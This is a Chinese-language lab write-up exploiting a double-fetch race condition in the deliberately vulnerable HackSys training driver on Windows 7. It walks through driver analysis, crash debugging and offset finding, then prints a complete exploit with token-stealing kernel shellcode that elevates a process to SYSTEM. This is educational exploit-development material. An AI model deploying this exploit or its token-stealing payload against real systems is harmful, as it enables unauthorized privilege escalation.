## **前言**

窥探Ring0漏洞世界：条件竞争漏洞

在多线程访问临界区的情况下，使用进程互斥可以使多个线程不能同时访问操作关键区的变量，条件竞争漏洞就源于没有对可能会被多个线程访问的变量进行保护，导致多重访问使得在一次操作中，操作的值在中间发生了变化。

### 实验环境：

•虚拟机：Windows 7 x86

•物理机：Windows 10 x64

•软件：IDA，Windbg，VS2022

##  **漏洞分析**

老样子，先IDA分析漏洞函数TriggerDoubleFetch，然后再看看源码

首先初始化800h字节栈缓冲区：![](https://image.3001.net/images/20220805/1659688548_62ecd6643da2f6f0b871a.png!small)

然后取出用户Buffer地址保存到局部变量里：

![](https://image.3001.net/images/20220805/1659688548_62ecd664c83c597cb2724.png!small)

接下来用用户传入参数的Size进行比较大小判断长度合法性：

![](https://image.3001.net/images/20220805/1659688549_62ecd66564cf2eb825c7d.png!small)

合法性通过之后，将用户缓冲区复制到内核里

![](https://image.3001.net/images/20220805/1659688550_62ecd666126b35e8df21f.png!small)

源码：

////// Trigger the Double Fetch Vulnerability  
//////The pointer to user mode buffer  
/// NTSTATUS  
__declspec(safebuffers)  
NTSTATUS  
TriggerDoubleFetch(  
_In_ PDOUBLE_FETCH UserDoubleFetch  
)  
{  
PVOID UserBuffer = NULL;  
NTSTATUS Status = STATUS_SUCCESS;  
ULONG KernelBuffer[BUFFER_SIZE] = { 0 };  
#ifdef SECURE  
SIZE_T UserBufferSize = 0;  
#endif  
PAGED_CODE();  
__try  
{  
//  
// Verify if the buffer resides in user mode  
//  
ProbeForRead(UserDoubleFetch, sizeof(DOUBLE_FETCH), (ULONG)__alignof(UCHAR));  
DbgPrint("[+] UserDoubleFetch: 0x%p\n", UserDoubleFetch);  
DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);  
DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));  
#ifdef SECURE  
UserBuffer = UserDoubleFetch->Buffer;  
UserBufferSize = UserDoubleFetch->Size;  
//  
// Verify if the 'UserDoubleFetch->Buffer' resides in user mode  
//  
ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));  
DbgPrint("[+] UserDoubleFetch->Buffer: 0x%p\n", UserBuffer);  
DbgPrint("[+] UserDoubleFetch->Size: 0x%zX\n", UserBufferSize);  
if (UserBufferSize > sizeof(KernelBuffer))  
{  
DbgPrint("[-] Invalid Buffer Size: 0x%zX\n", UserBufferSize);  
  
Status = STATUS_INVALID_PARAMETER;  
return Status;  
}  
//  
// Secure Note: This is secure because the developer is fetching  
// 'UserDoubleFetch->Buffer' and 'UserDoubleFetch->Size' from user  
// mode just once and storing it in a temporary variable. Later, this  
// stored values are passed to RtlCopyMemory()/memcpy(). Hence, there  
// will be no race condition  
//  
RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize);  
#else  
UserBuffer = UserDoubleFetch->Buffer;  
DbgPrint("[+] UserDoubleFetch->Buffer: 0x%p\n", UserBuffer);  
DbgPrint("[+] UserDoubleFetch->Size: 0x%zX\n", UserDoubleFetch->Size);  
//  
// Verify if the 'UserDoubleFetch->Buffer' resides in user mode  
//  
ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));  
if (UserDoubleFetch->Size > sizeof(KernelBuffer))  
{  
DbgPrint("[-] Invalid Buffer Size: 0x%zX\n", UserDoubleFetch->Size);  
Status = STATUS_INVALID_PARAMETER;  
return Status;  
}  
DbgPrint("[+] Triggering Double Fetch\n");  
//  
// Vulnerability Note: This is a vanilla Double Fetch vulnerability because
the  
// developer is fetching 'UserDoubleFetch->Size' from user mode twice and the  
// double fetched values are passed to RtlCopyMemory()/memcpy().  
// This creates a race condition and the size check could be bypassed which
will later  
// cause stack based buffer overflow  
//  
RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserDoubleFetch->Size);  
#endif  
}  
__except (EXCEPTION_EXECUTE_HANDLER)  
{  
Status = GetExceptionCode();  
DbgPrint("[-] Exception Code: 0x%X\n", Status);  
}  
return Status;  
}

安全版本和漏洞版本的区别在于，是否用局部变量接收了用户传来的参数，这里接收的是一个结构体指针，指向用户内存的值，安全版本一次性用局部变量保存了用户传来的值，然后进行校验和复制，不安全版本则是直接从用户内存去读取这个值来进行操作

如果用户内存的这个结构的值是变化的，当校验的时候，Size合法，当复制的时候Size不合法，则可能造成缓冲区栈溢出

##  **漏洞利用**

通过多线程来实现对用户缓冲区的操作，一个线程用来发起正常请求，一个线程用来修改Size大小：

DWORD WINAPI FlippingThread() {  
while (TRUE) {  
UserBuffer->Size = 0x900;  
}  
}  
DWORD WINAPI RacingThread() {  
while (TRUE) {  
ULONG WriteRet = 0;  
UserBuffer->Size = 0x100;  
DeviceIoControl(hDevice, 0x222037, (LPVOID)UserBuffer, UserBufferSize, NULL,
0, &WriteRet, NULL);  
}  
}

测试代码：

#include  
#include  
typedef struct _UserObject {  
ULONG_PTR Buffer;  
ULONG Size;  
}UserObject, * PUserObject;  
HANDLE hDevice = NULL;  
ULONG UserBufferSize = sizeof(UserObject);  
PUserObject UserBuffer = { 0 };  
int main()  
{  
hDevice = ::CreateFileW(L"\\\\\\\\.\\\HacksysExtremeVulnerableDriver",
GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);  
if (hDevice == INVALID_HANDLE_VALUE) {  
printf("[ERROR]Open Device Error\r\n");  
system("pause");  
exit(1);  
}  
else {  
printf("[INFO]Device Handle: 0x%X\n", hDevice);  
}  
UserBuffer = (PUserObject)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
UserBufferSize);  
if (!UserBuffer) {  
printf("[ERROR]Allocate ERROR");  
system("pause");  
exit(1);  
}  
else {  
printf("[INFO]Allocated Memory: 0x%p\n", UserBuffer);  
printf("[INFO]Allocation Size: 0x%X\n", UserBufferSize);  
}  
// 申请用户缓冲区，填充满A  
UserBuffer->Buffer = (ULONG_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
0x900);  
RtlFillMemory((void*)UserBuffer->Buffer, 0x900, 'A');  
// 启动多线程  
HANDLE hThreadRacing[10] = { 0 };  
HANDLE hThreadFlipping[10] = { 0 };  
for (size_t i = 0; i < 10; i++)  
{  
hThreadRacing[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RacingThread,
NULL, 0, 0);  
hThreadFlipping[i] = CreateThread(NULL, 0,
(LPTHREAD_START_ROUTINE)FlippingThread, NULL, 0, 0);  
}  
// 多线程超时则关闭线程  
if (WaitForMultipleObjects(10, hThreadRacing, TRUE, 120000)) {  
for (size_t i = 0; i < 10; i++)  
{  
TerminateThread(hThreadRacing[i], 0);  
CloseHandle(hThreadRacing[i]);  
TerminateThread(hThreadFlipping[i], 0);  
CloseHandle(hThreadFlipping[i]);  
}  
}  
HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer->Buffer);  
HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);  
UserBuffer = NULL;  
system("pause");  
system("cmd.exe");  
return 0;  
}

不出意外，很快windbg里就有反应了，异常0xC0000005，查看寄存器：

kd> r  
eax=00000000 ebx=88739938 ecx=158c4b84 edx=00000000 esi=83ec8087 edi=887398c8  
eip=41414141 esp=83aceae0 ebp=41414141 iopl=0nv up ei ng nz ac po nc  
cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010292  
41414141 ?? ???

发生了栈溢出，接下来用老方法去找溢出点，Kali的pattern_create.rb脚本：

┌──(selph㉿kali)-[~/桌面]  
└─$ ./pattern_create.rb -l 0x900  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8AAn0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8BBn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8CCn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7

用随机字符串替换缓冲区的值，再次执行，很快又崩溃了：

Access violation - code c0000005 (!!! second chance !!!)  
35724334 ?????

获取溢出点位置：

┌──(selph㉿kali)-[~/桌面]  
└─$ ./pattern_offset.rb -q 35724334 -l 0x900  
[*] Exact match at offset 2084

###  **编写 exp：**

最终版本exp代码，通过提升线程优先级来提高条件竞争发生的几率，代码如下：

#include  
#include  
#include  
// Windows 7 SP1 x86 Offsets  
#define KTHREAD_OFFSET0x124 // nt!_KPCR.PcrbData.CurrentThread  
#define EPROCESS_OFFSET 0x050 // nt!_KTHREAD.ApcState.Process  
#define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId  
#define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink  
#define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token  
#define SYSTEM_PID 0x004 // SYSTEM Process PID  
typedef struct _UserObject {  
ULONG_PTR Buffer;  
ULONG Size;  
}UserObject, * PUserObject;  
HANDLE hDevice = NULL;  
ULONG UserBufferSize = sizeof(UserObject);  
PUserObject UserBuffer = { 0 };  
const char* randomSeries =
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8AAn0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8BBn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8CCn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7";  
VOID TokenStealingPayloadWin7() {  
// Importance of Kernel Recovery  
__asm {  
pushad  
;获取当前进程EPROCESS  
xor eax, eax  
mov eax, fs: [eax + KTHREAD_OFFSET]  
mov eax, [eax + EPROCESS_OFFSET]  
mov ecx, eax  
;搜索system进程EPROCESS  
mov edx, SYSTEM_PID  
SearchSystemPID :  
mov eax, [eax + FLINK_OFFSET]  
sub eax, FLINK_OFFSET  
cmp[eax + PID_OFFSET], edx  
jne SearchSystemPID  
; token窃取  
mov edx, [eax + TOKEN_OFFSET]  
mov[ecx + TOKEN_OFFSET], edx  
;环境还原 + 返回  
popad  
xor eax, eax  
add esp, 12  
pop ebp  
ret 8  
}  
}  
DWORD WINAPI FlippingThread() {  
while (TRUE) {  
UserBuffer->Size = 0x824+4;  
}  
}  
DWORD WINAPI RacingThread() {  
while (TRUE) {  
ULONG WriteRet = 0;  
UserBuffer->Size = 0x200;  
DeviceIoControl(hDevice, 0x222037, (LPVOID)UserBuffer, UserBufferSize, NULL,
0, &WriteRet, NULL);  
}  
}  
int main()  
{  
PVOID EopPayload = &ampTokenStealingPayloadWin7  
hDevice = ::CreateFileW(L"\\\\\\\\.\\\HacksysExtremeVulnerableDriver",
GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);  
UserBuffer = (PUserObject)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
UserBufferSize);  
UserBuffer->Buffer = (ULONG_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
0x900);  
RtlCopyMemory((void*)UserBuffer->Buffer, randomSeries, 0x900);  
*(PULONG)(UserBuffer->Buffer + 0x824) = (ULONG)EopPayload;  
HANDLE hThreadRacing[10] = { 0 };  
HANDLE hThreadFlipping[10] = { 0 };  
for (size_t i = 0; i < 10; i++)  
{  
hThreadRacing[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RacingThread,
NULL, CREATE_SUSPENDED, 0);  
hThreadFlipping[i] = CreateThread(NULL, 0,
(LPTHREAD_START_ROUTINE)FlippingThread, NULL, CREATE_SUSPENDED, 0);  
// 设置优先级可以提升线程抢占到CPU的频率，更有机会执行到shellcode  
SetThreadPriority(hThreadRacing[i], THREAD_PRIORITY_HIGHEST);  
SetThreadPriority(hThreadFlipping[i], THREAD_PRIORITY_HIGHEST);  
ResumeThread(hThreadRacing[i]);  
ResumeThread(hThreadFlipping[i]);  
}  
if (WaitForMultipleObjects(10, hThreadRacing, TRUE, 60000)) {  
for (size_t i = 0; i < 10; i++)  
{  
TerminateThread(hThreadRacing[i], 0);  
CloseHandle(hThreadRacing[i]);  
TerminateThread(hThreadFlipping[i], 0);  
CloseHandle(hThreadFlipping[i]);  
}  
}  
HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer->Buffer);  
HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);  
UserBuffer = NULL;  
system("pause");  
system("cmd.exe");  
return 0;  
}

##  **截图演示**

![](https://image.3001.net/images/20220805/1659688550_62ecd666c7e169e577e40.png!small)

##  **参考资料**

##

•[1] hacksysteam/HackSysExtremeVulnerableDriver: HackSys Extreme Vulnerable
Windows Driver (github.com)

https://github.com/hacksysteam/HackSysExtremeVulnerableDriver

•[2] HEVD writeups - yuvaly0's blog

https://yuvaly0.github.io/2020/09/15/hevd-writeups

•[3] CreateThread function (processthreadsapi.h) - Win32 apps | Microsoft Docs

https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(PROCESSTHREADSAPI%252FCreateThread)%3Bk(CreateThread)%3Bk(DevLang-C%252B%252B)%3Bk(TargetOS-Windows)%26rd%3Dtrue

•[4] WaitForMultipleObjects function (synchapi.h) - Win32 apps | Microsoft
Docs

https://docs.microsoft.com/zh-cn/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjects?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(SYNCHAPI%252FWaitForMultipleObjects)%3Bk(WaitForMultipleObjects)%3Bk(DevLang-C%252B%252B)%3Bk(TargetOS-Windows)%26rd%3Dtrue

